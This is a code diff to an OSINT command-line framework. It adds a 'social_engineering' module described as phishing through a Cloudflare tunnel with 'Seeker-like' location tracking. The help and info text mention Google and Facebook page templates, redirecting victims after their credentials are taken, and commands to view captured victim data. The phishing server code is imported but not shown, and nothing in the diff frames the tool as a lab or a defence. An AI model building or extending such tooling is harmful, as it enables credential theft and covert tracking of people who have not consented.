@@ -12,6 +12,7 @@ from rich.table import Table
 from rich.tree import Tree
 from rich import box
 from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
+from rich.text import Text
 
 from core.engine import Engine
 
@@ -21,15 +22,20 @@ class OSINTFramework:
     def __init__(self):
         self.engine = None
         self.current_module = None
-        self.modules = ['email', 'username', 'domain', 'phone', 'image', 'crypto']
+        self.modules = ['email', 'username', 'domain', 'phone', 'image', 'crypto', 'social_engineering']
         self.module_options = {
             'email': {'target': None},
             'username': {'target': None},
             'domain': {'target': None},
             'phone': {'target': None},
             'image': {'target': None},
-            'crypto': {'target': None, 'depth': 2}
+            'crypto': {'target': None, 'depth': 2},
+            'social_engineering': {}
         }
+        self.social_engine = None
+        self.session = None
+        self.config = None
+        self.proxy_manager = None
 
     def show_help(self):
         console.print("""
@@ -42,11 +48,24 @@ class OSINTFramework:
   show reports         List saved reports
 
 [cyan]Module Commands[/cyan]
-  use <module>         Select module (email, username, domain, phone, image, crypto)
+  use <module>         Select module (email, username, domain, phone, image, crypto, social_engineering)
   set TARGET <target>  Set target for current module
   set DEPTH <1-3>      Set crypto depth (default: 2)
   run                  Run scan with current module and target
   info                 Show module information
+
+[cyan]Social Engineering Commands (after 'use social_engineering')[/cyan]
+  show templates       List available templates
+  show victims         View captured victim data
+  show logs            View real-time logs
+  show stats           View statistics
+  set TEMPLATE <name>  Set template (google, facebook, etc)
+  set TEMPLATE_PATH <path>  Set custom template path
+  set REDIRECT <url>   Set redirect URL after credentials
+  set PORT <port>      Set server port (default 8080)
+  set TYPE <phishing/seeker>  Set attack type
+  run                  Start server + tunnel
+  stop                 Stop server + tunnel
                 """)
 
     async def start(self):
@@ -59,7 +78,7 @@ class OSINTFramework:
             TimeElapsedColumn(),
             console=console
         ) as progress:
-            # Task 1: Loading modules (REAL)
+            # Task 1: Loading modules
             task1 = progress.add_task("[cyan]Loading modules...", total=len(self.modules))
             for module in self.modules:
                 try:
@@ -68,7 +87,7 @@ class OSINTFramework:
                     pass
                 progress.update(task1, advance=1)
 
-            # Task 2: Initializing engine (REAL)
+            # Task 2: Initializing engine
             task2 = progress.add_task("[cyan]Initializing engine...", total=3)
             await asyncio.sleep(0.1)
             progress.update(task2, advance=1)
@@ -77,7 +96,7 @@ class OSINTFramework:
             await asyncio.sleep(0.1)
             progress.update(task2, advance=1)
 
-            # Task 3: Connecting to APIs (REAL)
+            # Task 3: Connecting to APIs
             apis = ['haveibeenpwned', 'blockchain.info', 'etherscan', 'bscscan', 'polygonscan']
             task3 = progress.add_task("[cyan]Connecting to APIs...", total=len(apis))
             for _ in apis:
@@ -90,24 +109,45 @@ class OSINTFramework:
 
         async with Engine() as engine:
             self.engine = engine
+            self.session = engine.session
+            self.config = engine.config
+            self.proxy_manager = engine.proxy_manager
+            
             while True:
                 try:
-                    prompt = f"osint({self.current_module})> " if self.current_module else "osint> "
+                    if self.current_module:
+                        prompt = f"osint({self.current_module})> "
+                    else:
+                        prompt = "osint> "
+
                     cmd = Prompt.ask(prompt)
+
                     if not cmd or cmd.strip() == '':
                         continue
+
                     await self.execute(cmd)
+
                 except KeyboardInterrupt:
-                    console.print("\n[red]Interrupted[/red]")
-                    continue
+                    if self.current_module == 'social_engineering' and self.social_engine and self.social_engine.is_running:
+                        console.print("\n[red]Stopping server...[/red]")
+                        await self.social_engine.stop()
+                        console.print("[green]Server stopped. Back to menu.[/green]")
+                        continue
+                    else:
+                        console.print("\n[red]Interrupted. Exiting...[/red]")
+                        sys.exit(0)
 
     async def execute(self, cmd):
         parts = cmd.split()
         if not parts:
             return
+
         command = parts[0].lower()
 
         if command == 'exit':
+            if self.social_engine and self.social_engine.is_running:
+                console.print("[yellow]Stopping server first...[/yellow]")
+                await self.social_engine.stop()
             console.print("[red]Exiting...[/red]")
             sys.exit(0)
 
@@ -123,20 +163,36 @@ class OSINTFramework:
             if len(parts) < 2:
                 console.print("[red]show what? modules, options, reports[/red]")
                 return
+
             sub = parts[1].lower()
+
             if sub == 'modules':
                 console.print("[cyan]Available modules:[/cyan]")
                 for m in self.modules:
                     console.print(f"  - {m}")
+
             elif sub == 'options':
                 if not self.current_module:
                     console.print("[red]No module selected. Use: use <module>[/red]")
                     return
-                opts = self.module_options.get(self.current_module, {})
-                console.print(f"[cyan]Options for {self.current_module}:[/cyan]")
-                console.print(f"  TARGET  => {opts.get('target') or '(not set)'}")
-                if self.current_module == 'crypto':
-                    console.print(f"  DEPTH   => {opts.get('depth', 2)}")
+                    
+                if self.current_module == 'social_engineering':
+                    console.print(f"[cyan]Options for {self.current_module}:[/cyan]")
+                    console.print(f"  TEMPLATE     => {self.social_engine.template if self.social_engine else '(not set)'}")
+                    console.print(f"  REDIRECT     => {self.social_engine.redirect_url if self.social_engine else '(not set)'}")
+                    console.print(f"  PORT         => {self.social_engine.port if self.social_engine else '8080'}")
+                    console.print(f"  TYPE         => {self.social_engine.type if self.social_engine else 'phishing'}")
+                    console.print(f"  TEMPLATE_PATH => {self.social_engine.template_path if self.social_engine else '(not set)'}")
+                    console.print(f"  STATUS       => {'[green]Running[/green]' if self.social_engine and self.social_engine.is_running else '[red]Stopped[/red]'}")
+                    if self.social_engine and self.social_engine.tunnel_url:
+                        console.print(f"  TUNNEL URL   => {self.social_engine.tunnel_url}")
+                else:
+                    opts = self.module_options.get(self.current_module, {})
+                    console.print(f"[cyan]Options for {self.current_module}:[/cyan]")
+                    console.print(f"  TARGET  => {opts.get('target') or '(not set)'}")
+                    if self.current_module == 'crypto':
+                        console.print(f"  DEPTH   => {opts.get('depth', 2)}")
+
             elif sub == 'reports':
                 reports = os.listdir('reports') if os.path.exists('reports') else []
                 if reports:
@@ -145,6 +201,7 @@ class OSINTFramework:
                         console.print(f"  - {r}")
                 else:
                     console.print("[yellow]No reports found[/yellow]")
+
             else:
                 console.print(f"[red]Unknown: show {sub}[/red]")
 
@@ -152,10 +209,20 @@ class OSINTFramework:
             if len(parts) < 2:
                 console.print("[red]Usage: use <module>[/red]")
                 return
+
             module = parts[1].lower()
-            if module in self.modules:
+
+            if module == 'social_engineering':
+                self.current_module = module
+                from modules.social_engineering import SocialEngineering
+                if not self.social_engine:
+                    self.social_engine = SocialEngineering(self.session, self.config, self.proxy_manager)
+                console.print("[green]Social Engineering module loaded[/green]")
+
+            elif module in self.modules:
                 self.current_module = module
                 console.print(f"[green]Module {module} loaded[/green]")
+
             else:
                 console.print(f"[red]Module {module} not found[/red]")
                 console.print(f"[cyan]Available: {', '.join(self.modules)}[/cyan]")
@@ -164,14 +231,39 @@ class OSINTFramework:
             if len(parts) < 3:
                 console.print("[red]Usage: set <option> <value>[/red]")
                 return
+
             if not self.current_module:
                 console.print("[red]No module selected. Use: use <module>[/red]")
                 return
+
+            # Social Engineering specific set
+            if self.current_module == 'social_engineering':
+                option = parts[1].upper()
+                value = ' '.join(parts[2:])
+                
+                if option == 'TEMPLATE':
+                    await self.social_engine.set_option('TEMPLATE', value)
+                elif option == 'TEMPLATE_PATH':
+                    await self.social_engine.set_option('TEMPLATE_PATH', value)
+                elif option == 'REDIRECT':
+                    await self.social_engine.set_option('REDIRECT', value)
+                elif option == 'PORT':
+                    await self.social_engine.set_option('PORT', value)
+                elif option == 'TYPE':
+                    await self.social_engine.set_option('TYPE', value)
+                else:
+                    console.print(f"[red]Unknown option: {option}[/red]")
+                    console.print("[cyan]Options: TEMPLATE, TEMPLATE_PATH, REDIRECT, PORT, TYPE[/cyan]")
+                return
+
+            # Regular module set
             option = parts[1].upper()
             value = ' '.join(parts[2:])
+
             if option == 'TARGET':
                 self.module_options[self.current_module]['target'] = value
                 console.print(f"[green]TARGET => {value} (for {self.current_module})[/green]")
+
             elif option == 'DEPTH':
                 if self.current_module != 'crypto':
                     console.print("[red]DEPTH only available for crypto module[/red]")
@@ -181,6 +273,7 @@ class OSINTFramework:
                     console.print(f"[green]DEPTH => {value}[/green]")
                 else:
                     console.print("[red]DEPTH must be 1-3[/red]")
+
             else:
                 console.print(f"[red]Unknown option: {option}[/red]")
                 console.print("[cyan]Options: TARGET, DEPTH[/cyan]")
@@ -189,10 +282,13 @@ class OSINTFramework:
             if len(parts) < 2:
                 console.print("[red]Usage: unset <option>[/red]")
                 return
+
             if not self.current_module:
                 console.print("[red]No module selected. Use: use <module>[/red]")
                 return
+
             option = parts[1].upper()
+
             if option == 'TARGET':
                 self.module_options[self.current_module]['target'] = None
                 console.print("[green]TARGET unset[/green]")
@@ -209,18 +305,55 @@ class OSINTFramework:
             if not self.current_module:
                 console.print("[red]No module selected. Use: use <module>[/red]")
                 return
+
+            # Social Engineering run
+            if self.current_module == 'social_engineering':
+                await self.social_engine.run()
+                return
+
+            # Regular module run
             opts = self.module_options.get(self.current_module, {})
             target = opts.get('target')
+            
             if not target:
                 console.print("[red]No target set. Use: set TARGET <target>[/red]")
                 return
+
             depth = opts.get('depth')
             await self._run_scan(self.current_module, target, depth)
+
+        elif command == 'stop':
+            if self.current_module == 'social_engineering' and self.social_engine:
+                await self.social_engine.stop()
+            else:
+                console.print("[red]Stop only available for social_engineering module[/red]")
 
         elif command == 'info':
             if not self.current_module:
                 console.print("[red]No module selected. Use: use <module>[/red]")
                 return
+
+            if self.current_module == 'social_engineering':
+                console.print("""
+[cyan]Module: social_engineering[/cyan]
+[cyan]Description:[/cyan]
+  Social Engineering - Phishing via Cloudflare Tunnel + Seeker-like tracking
+[cyan]Options:[/cyan]
+  TEMPLATE      - Template name (google, facebook, etc)
+  TEMPLATE_PATH - Path to custom template
+  REDIRECT      - URL to redirect after credentials
+  PORT          - Server port (default: 8080)
+  TYPE          - phishing or seeker
+[cyan]Commands:[/cyan]
+  show templates  - List available templates
+  show victims    - View captured data
+  show logs       - View logs
+  show stats      - View statistics
+  run             - Start server + tunnel
+  stop            - Stop server + tunnel
+                """)
+                return
+
             console.print(f"""
 [cyan]Module: {self.current_module}[/cyan]
 [cyan]Description:[/cyan]
@@ -246,6 +379,7 @@ class OSINTFramework:
 
     async def _run_scan(self, module, target, depth=None):
         console.print(f"\n[cyan]Scanning {target} with {module} module...[/cyan]")
+
         try:
             with Progress(
                 SpinnerColumn(),
@@ -256,20 +390,24 @@ class OSINTFramework:
                 console=console
             ) as progress:
                 task = progress.add_task("[cyan]Running scan...", total=100)
+
                 if module == 'crypto':
                     if depth is None:
                         depth = 2
                     result = await self.engine.run_module(module, target, depth)
                 else:
                     result = await self.engine.run_module(module, target)
+
                 progress.update(task, completed=100)
 
             if module == 'crypto':
                 self.display_crypto_results(result)
             else:
                 self.display_results(result, module)
+
             filename = self.engine.save_report(target, 'json')
             console.print(f"\n[green]Report saved: {filename}[/green]")
+
         except Exception as e:
             console.print(f"[red]Error: {str(e)}[/red]")
 
@@ -277,9 +415,11 @@ class OSINTFramework:
         if isinstance(data, dict) and 'error' in data:
             console.print(f"[red]Error: {data['error']}[/red]")
             return
+
         table = Table(title=f"{module.upper()} RESULTS", box=box.ROUNDED)
         table.add_column("Field", style="cyan")
         table.add_column("Value", style="white")
+
         for key, value in data.items():
             if isinstance(value, list):
                 if key == 'breaches' and value:
@@ -302,15 +442,18 @@ class OSINTFramework:
                 table.add_row(key, "[green]Yes[/green]" if value else "[red]No[/red]")
             else:
                 table.add_row(key, str(value))
+
         console.print(table)
 
     def display_crypto_results(self, data):
         if isinstance(data, dict) and 'error' in data:
             console.print(f"[red]Error: {data['error']}[/red]")
             return
+
         table = Table(title="CRYPTO RESULTS", box=box.ROUNDED)
         table.add_column("Field", style="cyan")
         table.add_column("Value", style="white")
+
         for key, value in data.items():
             if key == 'tree':
                 continue
@@ -322,10 +465,13 @@ class OSINTFramework:
                 table.add_row(key, "[green]Yes[/green]" if value else "[red]No[/red]")
             else:
                 table.add_row(key, str(value))
+
         console.print(table)
         console.print("")
+
         tree_data = data.get('tree', {})
         root = tree_data.get('root', {})
+
         if root and root.get('children'):
             console.print(Panel("Transaction Tree", border_style="green"))
             tree = Tree(f"[bold green]{root.get('address', '')} (ROOT)")
@@ -337,9 +483,11 @@ class OSINTFramework:
             address = child.get('address', '')[:20] + '...'
             amount = child.get('amount', 0)
             branch = tree.add(f"[yellow]{address} - {amount}")
+
             grand_children = child.get('children', [])
             if grand_children:
                 self.build_tree_visual(branch, grand_children, level + 1)
+
             if len(children) > 10 and level == 1:
                 tree.add(f"[dim]... and {len(children) - 10} more[/dim]")
 
